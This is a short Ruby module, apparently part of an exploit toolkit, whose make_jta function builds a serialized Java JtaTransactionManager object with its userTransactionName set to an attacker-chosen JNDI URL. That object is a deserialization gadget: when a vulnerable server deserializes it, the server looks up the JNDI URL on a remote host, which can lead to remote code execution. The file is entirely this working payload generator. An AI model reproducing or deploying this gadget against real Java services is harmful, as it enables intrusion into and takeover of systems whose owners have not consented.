
require_relative '../serialize'

module Java
  module Serialize
    module Payloads
      module Spring
        def make_jta(jndiUrl)
          Java::Serialize::JavaObject.new('Lorg/springframework/transaction/jta/JtaTransactionManager;',
                                          'userTransactionName' => jndiUrl)
        end

        module_function :make_jta
        end
    end
  end
end
